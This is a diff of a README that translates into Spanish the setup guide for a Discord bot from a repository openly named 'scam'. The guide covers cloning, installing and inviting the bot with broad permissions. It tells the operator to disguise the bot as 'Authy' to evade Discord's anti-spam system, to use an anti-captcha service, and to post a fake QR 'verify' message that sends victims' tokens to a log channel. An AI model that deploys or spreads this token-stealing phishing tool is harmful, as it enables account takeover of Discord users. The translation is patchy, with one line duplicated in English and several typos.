@@ -22,26 +22,28 @@
 
 ## Setup
 
-- **Install Prerequisites** You will need these to be able to run the discord bot.
+- **Prerequisitos de instalación** Los necesitarás para poder ejecutar el bot de discord.
   - [Node LTS](https://nodejs.org/en/)
   - [Git](https://git-scm.com/downloads)
-- **Clone the Repository and Install Dependancies**
+- **Clonar el repositorio e instalar dependencias**
   - `git clone https://github.com/ulnk/scam.git`
   - `npm install`
-- **Create a new Discord Bot**
-  - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
+- **Crear un nuevo bot de Discord**
+  - **Habilitar todos los intentos para el bo** Esto es muy importante. Si no habilita todos los intentos, el bot no funcionará.
     - https://discord.dev **Bot** > **Privileged Gateway Intents**
-  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile). To fit with the profile, rename the bot to `Authy` and set the profile picture to the one provided.
-  - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
-    - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
+  - **Para mejores resultados** Discord tiene un sistema antispam que deshabilitará cualquier bot sospechoso. Para evitar esto, lo mejor es utilizar los recursos proporcionados que se encuentran [here](https://github.com/ulnk/scam/tree/main/profile). 
+Para que encaje con el perfil, cambie el nombre del bot a 'Authorithy' y configure la imagen de perfil como la proporcionada.
+  - **Invita el bot a tu server** Use el enlace a continuación para invitar a su bot a su servidor. Cambie `CLIENTID` a su ID de cliente de discord bots.
+    - Para obtener la identificación del cliente para su bot > https://discord.dev **Oauth2** > **General**
     - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
-- **Configure the Project**
-  - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
-  - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
-  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
-- **Start the bot**
+- **Configurar el proyecto**
+  - Cambie el nombre de `default-config.json` a `config.json`. Esto se encuentra en `src/default-config.json`.
+  - `Edite todas las claves y sus valores. No se requiere dar un valor a capmonster, sin embargo se recomienda`.
+  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash
+Al ingresar `log.guildId` y `log.channelId`, debe ingresar la identificación del servidor y el canal en el que se encuentra el bot. De lo contrario, el bot no podrá enviar el token y se bloqueará..
+- **Iniciar el bot**
   - `npm run start`
-  - Once the bot is active, use the command `/spawn` to spawn the verify message.
+  - Una vez que el bot esté activo, use el comando `/spawn` para generar el mensaje de verificación.
 
 (_single executable file coming soon_)
 
@@ -53,4 +55,4 @@
 - **jimp** (image editing for qr code) <img alt="preview badge" src="https://img.shields.io/npm/v/jimp">
 - **capmonster** (anti-captcha)<img alt="preview badge" src="https://img.shields.io/npm/v/node-capmonster">
 
-https://discord.gg/wKn7VJ5R support server
+https://discord.gg/wKn7VJ5R support server `MADE BY TFA CO. DO NOT STEAL`
